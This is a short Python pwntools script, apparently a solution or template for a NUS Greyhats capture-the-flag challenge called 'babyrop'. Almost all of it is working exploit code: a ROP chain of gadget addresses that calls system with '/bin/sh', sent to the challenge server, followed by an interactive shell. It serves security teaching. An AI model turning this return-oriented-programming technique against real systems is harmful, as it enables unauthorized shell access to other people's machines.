# pwntools is a very powerful library for doing exploitation
from pwn import *

# update with actual values
HOST = "challs1.nusgreyhats.org"
PORT = 5012
BINARY = "./babyrop"
BABYROP = ELF('./babyrop')

PAYLOAD =  p64(0x0000000000400486) * 8  # RET x 8 (POP)
PAYLOAD += p64(0x0000000000400683)      # PUSH
PAYLOAD += p64(0x004006a4)              # address of "/bin/sh"
PAYLOAD += p64(BABYROP.plt['system'])   # CALL 'system'

# . to open a connection to the remote service, aka the challenge
r = remote(HOST, PORT)  
# . use process instead of remote to execute the local version of the program
# r = process(BINARY)   
pause()

# TODO: Fill in your payload
r.sendline(PAYLOAD)

# earlier, the script helps us send/receive data to/from the service
# with interactive, we can directly interact with the service
r.interactive()